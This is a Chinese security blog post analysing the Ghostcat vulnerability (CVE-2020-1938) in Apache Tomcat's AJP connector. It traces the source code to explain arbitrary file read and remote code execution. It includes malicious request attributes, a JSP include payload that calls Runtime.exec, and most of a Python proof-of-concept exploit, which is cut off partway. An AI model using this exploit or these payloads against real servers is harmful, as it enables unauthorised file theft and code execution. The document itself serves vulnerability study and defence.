<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2020-1938）Apache Tomcat 文件包含漏洞一、漏洞简介对于处在漏洞影响版本范围内的 Tomcat 而言，若其开启 AJP Connector且攻击者能够访问 AJP Connector 服务端口的情况下，即存在被 Ghostcat漏洞利用的风险。 注意 Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009 二、漏洞影响">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Tomcat/%EF%BC%88CVE-2020-1938%EF%BC%89Apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2020-1938）Apache Tomcat 文件包含漏洞一、漏洞简介对于处在漏洞影响版本范围内的 Tomcat 而言，若其开启 AJP Connector且攻击者能够访问 AJP Connector 服务端口的情况下，即存在被 Ghostcat漏洞利用的风险。 注意 Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009 二、漏洞影响">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId25.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId26.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId27.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId28.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId29.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId30.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId31.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId32.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId34.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId35.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId36.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId37.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId38.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId39.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId40.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId41.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId43.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId44.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId45.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId46.png">
<meta property="article:published_time" content="2022-07-08T06:26:05.528Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.402Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId25.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Tomcat/（CVE-2020-1938）Apache Tomcat 文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2020-1938%EF%BC%89Apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:05.528Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-1938）Apache-Tomcat-文件包含漏洞"><a href="#（CVE-2020-1938）Apache-Tomcat-文件包含漏洞" class="headerlink" title="（CVE-2020-1938）Apache Tomcat 文件包含漏洞"></a>（CVE-2020-1938）Apache Tomcat 文件包含漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>对于处在漏洞影响版本范围内的 Tomcat 而言，若其开启 AJP Connector<br>且攻击者能够访问 AJP Connector 服务端口的情况下，即存在被 Ghostcat<br>漏洞利用的风险。</p>
<p>注意 Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
<li><p>  Apache Tomcat 6</p>
</li>
<li><p>  Apache Tomcat 7 &lt; 7.0.100</p>
</li>
<li><p>  Apache Tomcat 8 &lt; 8.5.51</p>
</li>
<li><p>  Apache Tomcat 9 &lt; 9.0.31</p>
</li>
</ul>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>由于 <strong>AJP</strong> 并不是一个 <strong>HTTP</strong> 业务流，走的是 <strong>Socket</strong> ，所以<br><strong>tomcat</strong> 前面接收业务流的时候调用的是一个 <strong>Socket</strong> 解析类<br><strong>SocketProcessorBase#dorun</strong> 来处理 <strong>ajp</strong> 传入的二进制流。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
<p>而后面这部分的数据流实际上都是 <strong>socket</strong> 内部进行流传处理。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
<p>这里需要感谢 <strong>tomcat</strong> 优雅的代码风格，可读性真强，和 <strong>socket</strong> 相关的<br><strong>service</strong><br>就下图里面的这些，所以AJP的业务流自然就落在了<code>org/apache/coyote/ajp/AjpProcessor#service</code>这个方法上面进行处理。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
<p>这<code>org/apache/coyote/ajp/AjpProcessor#service</code>这个方法里面就留两个关键部分，其他代码太繁杂了，无关大雅，这里首先<code>this.prepareRequest()</code>方法是针对整个业务流进行预处理。</p>
<pre><code>Copy to clipboard    public SocketState service(SocketWrapperBase&lt;?&gt; socket) throws IOException &#123;
      ...
        while(!this.getErrorState().isError() &amp;&amp; !this.endpoint.isPaused()) &#123;
            try &#123;
              ...
            if (this.getErrorState().isIoAllowed()) &#123;
                rp.setStage(2);

                try &#123;
                    this.prepareRequest();
                &#125; catch (Throwable var12) &#123;
                            ...
            if (this.getErrorState().isIoAllowed()) &#123;
                try &#123;
                    rp.setStage(3);
                    this.getAdapter().service(this.request, this.response);
                &#125; 
              ...
    &#125;
</code></pre>
<p>跟进 <strong>prepareRequest</strong> 方法，这个方法会进行一个 <strong>while</strong> 为 <strong>true</strong><br>的无限循环，根据<code>attributeCode</code>的结果进行选择，命中 <strong>case 10</strong><br>核心中有个<code>request.setAttribute(n, v)</code>方法，这个方法会从我们之前设置方法中取值，设置，遍历循环POC中的<code>javax.servlet.include.request_uri</code>，<code>javax.servlet.include.path_info</code>，<code>javax.servlet.include.servlet_path</code>这三个属性对应的值，并且通过PUT方法进行赋值。</p>
<pre><code>Copy to clipboard    private void prepareRequest() &#123;
                ...
        while(true) &#123;
            byte attributeCode;
            while((attributeCode = this.requestHeaderMessage.getByte()) != -1) &#123;
                switch(attributeCode) &#123;
                ...
                case 10:
                                        ...
                    &#125; else &#123;
                        this.request.setAttribute(n, v);
                    &#125;
                    break;
</code></pre>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
<p>好了，这里知道了在 <strong>prepareRequest</strong><br>方法中核心是将三个值动态赋予我们想要的结果，再回到<code>org/apache/coyote/ajp/AjpProcessor#service</code>中，在经过<br><strong>prepareRequest</strong><br>方法处理之后来到的就是<code>getAdapter().service(this.request, this.response);</code>，这个<br><strong>serivce</strong> 就是后续处理 <strong>request</strong> 对象和 <strong>response</strong> 对象了。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
<p>在 <strong>org/apache/catalina/connector/CoyoteAdapter#service</strong><br>这个类中，主要是设置一些连接的时候一些属性，然后通过 <strong>invoke</strong><br>反射方法，根据 <strong>request</strong> 对象和 <strong>response</strong><br>对象进入后面的HTTP处理逻辑。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
<p>所以又回到了前面的老话，tomcat完善的代码结构，HTTP的逻辑服务处理，自然是落在了<br><strong>javax/servlet/http/HttpServlet#service</strong> 当中。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>前面是整个 <strong>AJP-&gt;HTTP</strong> 整个过程，继续往下跟入，因为通过 <strong>AJP</strong><br>转换之后，进行的是 <strong>HTTP GET</strong> 请求，所以来到的自然是是下图中代码位置。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
<p>跟进 <strong>doGet</strong> 自然来到之前安恒通告说的地方。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
<p>继续跟入 <strong>serveResource</strong>，首先 <strong>getRelativePath</strong> 从之前传入的<br><strong>request</strong> 对象中获取 <strong>path</strong> 。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
<p>跟进 <strong>getRelativePath</strong> ，一眼就知道为什么要设置 <strong>request_uri</strong><br>、<strong>path_info</strong> 、<strong>servlet_path</strong><br>这三个属性了，通过路径的拼接，最后返回的 <strong>servletPath</strong><br>为<code>/</code>，容器内部为 <strong>/WEB-INF/web.xml</strong> 的文件内容。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId37.png"></p>
<p>继续回到 <strong>serveResource</strong> 方法中 <strong>getResource</strong> 根据前面的 <strong>path</strong><br>也就是 <strong>/WEB-INF/web.xml</strong><br>进行资源获取。而这里是没办法<code>../</code>出去的，原因继续往下看。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId38.png"></p>
<p>在 <strong>getResource</strong> 当中有个 <strong>validate</strong> ，这个检查往后走会调用<br><strong>normalize</strong> 进行目录遍历的检查，之后就是输出读到的内容了。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId39.png"></p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId40.png"></p>
<p>由于当前 <strong>AJP</strong> 出不了 <strong>webapps</strong><br>目录，但是是可以做到任意目录下读的，比如我需要读 <strong>/example/2.txt</strong><br>下的文件，只需要这样配置就好了。</p>
<pre><code>Copy to clipboard    &#123;&#39;name&#39;:&#39;req_attribute&#39;,&#39;value&#39;:[&#39;javax.servlet.include.request_uri&#39;,&#39;/examples&#39;]&#125;,
    &#123;&#39;name&#39;:&#39;req_attribute&#39;,&#39;value&#39;:[&#39;javax.servlet.include.path_info&#39;,2.txt]&#125;,
    &#123;&#39;name&#39;:&#39;req_attribute&#39;,&#39;value&#39;:[&#39;javax.servlet.include.servlet_path&#39;,&#39;/&#39;]&#125;,
    ])
</code></pre>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId41.png"></p>
<p>附上任意文件读取的调用栈</p>
<pre><code>Copy to clipboardserveResource:839, DefaultServlet (org.apache.catalina.servlets)
doGet:504, DefaultServlet (org.apache.catalina.servlets)
service:634, HttpServlet (javax.servlet.http)
service:484, DefaultServlet (org.apache.catalina.servlets)
service:741, HttpServlet (javax.servlet.http)
internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilter:52, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
invoke:199, StandardWrapperValve (org.apache.catalina.core)
invoke:96, StandardContextValve (org.apache.catalina.core)
invoke:493, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:137, StandardHostValve (org.apache.catalina.core)
invoke:81, ErrorReportValve (org.apache.catalina.valves)
invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:87, StandardEngineValve (org.apache.catalina.core)
service:343, CoyoteAdapter (org.apache.catalina.connector)
service:476, AjpProcessor (org.apache.coyote.ajp)
process:66, AbstractProcessorLight (org.apache.coyote)
process:808, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1498, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:745, Thread (java.lang)
</code></pre>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><pre><code>Copy to clipboard&quot;HTTP/1.1&quot; &quot;/1.jsp&quot; 127.0.0.1 localhost porto 8009 false &quot;Cookie:AAAA=BBBB&quot; &quot;javax.servlet.include.request_uri:/&quot;,&quot;javax.servlet.include.path_info:1.txt&quot;,&quot;javax.servlet.include.servlet_path:/upload/&quot;
</code></pre>
<p><code>org/apache/jasper/servlet/JspServlet#service</code>负责处理<code>xxx.jsp</code>访问逻辑，跟进来<br><strong>jspUri</strong> 是通过 <strong>servlet_path</strong> 和 <strong>path_info</strong> 拼接而来的。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId43.png"></p>
<p>之后便会进入 <strong>serviceJspFile</strong> 逻辑进行处理。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId44.png"></p>
<p>跟进 <strong>serviceJspFile</strong> 方法，首先先通过 <strong>getResource</strong><br>获取上传文件的内容，然后再通过初始化 <strong>wrapper</strong><br>对象传入相关参数，然后再调用 <strong>JspServletWrapper#service</strong> 进行解析。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId45.png"></p>
<p>这简单解释一下，<strong>RCE</strong> 的核心需要进入的 <strong>JspServlet</strong> ，我们平常访问<br><strong>xxx.jsp</strong> 是进入到 <strong>Jspservlet</strong> ，poc中访问<code>/1.jsp</code>通过 <strong>AJP</strong><br>发包的过程中实际上就是我们的Get请求访问<code>www.xxx.com/1.jsp</code>，所以这里自然进入了<br><strong>JspServlet</strong> 当中，然后再配合 <strong>getResource</strong> 获取上传的文件内容，调用<br><strong>Jsp</strong> 引擎进行解析，自然达到了RCE的效果。</p>
<p>最后附上RCE的调用栈</p>
<pre><code>Copy to clipboardexec:347, Runtime (java.lang)
_jspService:1, _1_txt (org.apache.jsp)
service:70, HttpJspBase (org.apache.jasper.runtime)
service:741, HttpServlet (javax.servlet.http)
service:476, JspServletWrapper (org.apache.jasper.servlet)
serviceJspFile:386, JspServlet (org.apache.jasper.servlet)
service:330, JspServlet (org.apache.jasper.servlet)
service:741, HttpServlet (javax.servlet.http)
internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilter:52, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
invoke:199, StandardWrapperValve (org.apache.catalina.core)
invoke:96, StandardContextValve (org.apache.catalina.core)
invoke:493, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:137, StandardHostValve (org.apache.catalina.core)
invoke:81, ErrorReportValve (org.apache.catalina.valves)
invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:87, StandardEngineValve (org.apache.catalina.core)
service:343, CoyoteAdapter (org.apache.catalina.connector)
service:476, AjpProcessor (org.apache.coyote.ajp)
process:66, AbstractProcessorLight (org.apache.coyote)
process:808, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1498, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:745, Thread (java.lang)
</code></pre>
<p><strong>后话</strong></p>
<p>我试了一下jsp的文件包含，这个demo下也是可以的，所以实际上RCE就是jsp的文件包含搞的鬼，要先上传一个文件，这个文件路径可被包含，然后读取模版解析，最后RCE。</p>
<pre><code>Copy to clipboard//1.jsp
&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot; %&gt;
&lt;%@ include file=&quot;1.txt&quot; %&gt;

//1.txt
&lt;%@ Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;);%&gt;
</code></pre>
<p>另外前面可能有师傅会问为什么是GET，原因是下面这个POC有<code>forwardrequest 2</code>，根据AJP数据包格式<code>第6个字节(02)代表是Get请求</code>。另外在Tomcat中也有相关映射关系，在<br><strong>AjpProcessor</strong> 做 <strong>prepareRequest</strong><br>处理的时候会根据字节选择相关的请求方式。</p>
<p><img src="/resource/(CVE-2020-1938)ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId46.png"></p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>(py27)&gt; python .\cve-2020-1938-poc.py -h
usage: cve-2020-1938-poc.py [-h] [-p PORT] [-w WEBAPP] [-f FILE] [-l] target

positional arguments:
  target                Hostname or IP to attack

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  AJP port to attack (default is 8009)
  -w WEBAPP, --webapp WEBAPP
                        Which webapp to attack (default is ROOT
  -f FILE, --file FILE  file path :(WEB-INF/web.xml)
  -l, --lfi             local file include
</code></pre>
<h3 id="python2-7"><a href="#python2-7" class="headerlink" title="python2.7"></a>python2.7</h3><pre><code>#!/usr/bin/env python
# CNVD-2020-10487  Tomcat-Ajp lfi
# Based on: https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/
#
# Some references:
# https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html
import socket
import struct
import argparse


def pack_string(s):
    if s is None:
        return struct.pack(&quot;&gt;h&quot;, -1)
    l = len(s)
    return struct.pack(&quot;&gt;H%dsb&quot; % l, l, s.encode(&#39;utf8&#39;), 0)


def unpack(stream, fmt):
    size = struct.calcsize(fmt)
    buf = stream.read(size)
    return struct.unpack(fmt, buf)


def unpack_string(stream):
    size, = unpack(stream, &quot;&gt;h&quot;)
    if size == -1:  # null string
        return None
    res, = unpack(stream, &quot;%ds&quot; % size)
    stream.read(1)  # \0
    return res


class NotFoundException(Exception):
    pass


class AjpBodyRequest(object):
    # server == web server, container == servlet
    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
    MAX_REQUEST_LENGTH = 8186

    def __init__(self, data_stream, data_len, data_direction=None):
        self.data_stream = data_stream
        self.data_len = data_len
        self.data_direction = data_direction

    def serialize(self):
        data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)
        if len(data) == 0:
            return struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, 0x00)
        else:
            res = struct.pack(&quot;&gt;H&quot;, len(data))
            res += data
        if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:
            header = struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, len(res))
        else:
            header = struct.pack(&quot;&gt;bbH&quot;, 0x41, 0x42, len(res))
        return header + res

    def send_and_receive(self, socket, stream):
        while True:
            data = self.serialize()
            socket.send(data)
            r = AjpResponse.receive(stream)
            while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:
                r = AjpResponse.receive(stream)

            if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:
                break


class AjpForwardRequest(object):
    _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(
        28)
    REQUEST_METHODS = &#123;&#39;GET&#39;: GET, &#39;POST&#39;: POST, &#39;HEAD&#39;: HEAD,
                       &#39;OPTIONS&#39;: OPTIONS, &#39;PUT&#39;: PUT, &#39;DELETE&#39;: DELETE, &#39;TRACE&#39;: TRACE&#125;
    # server == web server, container == servlet
    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
    COMMON_HEADERS = [&quot;SC_REQ_ACCEPT&quot;,
                      &quot;SC_REQ_ACCEPT_CHARSET&quot;, &quot;SC_REQ_ACCEPT_ENCODING&quot;, &quot;SC_REQ_ACCEPT_LANGUAGE&quot;, &quot;SC_REQ_AUTHORIZATION&quot;,
                      &quot;SC_REQ_CONNECTION&quot;, &quot;SC_REQ_CONTENT_TYPE&quot;, &quot;SC_REQ_CONTENT_LENGTH&quot;, &quot;SC_REQ_COOKIE&quot;, &quot;SC_REQ_COOKIE2&quot;,
                      &quot;SC_REQ_HOST&quot;, &quot;SC_REQ_PRAGMA&quot;, &quot;SC_REQ_REFERER&quot;, &quot;SC_REQ_USER_AGENT&quot;
                      ]
    ATTRIBUTES = [&quot;context&quot;, &quot;servlet_path&quot;, &quot;remote_user&quot;, &quot;auth_type&quot;, &quot;query_string&quot;, &quot;route&quot;,
                  &quot;ssl_cert&quot;, &quot;ssl_cipher&quot;, &quot;ssl_session&quot;, &quot;req_attribute&quot;, &quot;ssl_key_size&quot;, &quot;secret&quot;, &quot;stored_method&quot;]

    def __init__(self, data_direction=None):
        self.prefix_code = 0x02
        self.method = None
        self.protocol = None
        self.req_uri = None
        self.remote_addr = None
        self.remote_host = None
        self.server_name = None
        self.server_port = None
        self.is_ssl = None
        self.num_headers = None
        self.request_headers = None
        self.attributes = None
        self.data_direction = data_direction

    def pack_headers(self):
        self.num_headers = len(self.request_headers)
        res = &quot;&quot;
        res = struct.pack(&quot;&gt;h&quot;, self.num_headers)
        for h_name in self.request_headers:
            if h_name.startswith(&quot;SC_REQ&quot;):
                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1
                res += struct.pack(&quot;BB&quot;, 0xA0, code)
            else:
                res += pack_string(h_name)

            res += pack_string(self.request_headers[h_name])
        return res

    def pack_attributes(self):
        res = b&quot;&quot;
        for attr in self.attributes:
            a_name = attr[&#39;name&#39;]
            code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1
            res += struct.pack(&quot;b&quot;, code)
            if a_name == &quot;req_attribute&quot;:
                aa_name, a_value = attr[&#39;value&#39;]
                res += pack_string(aa_name)
                res += pack_string(a_value)
            else:
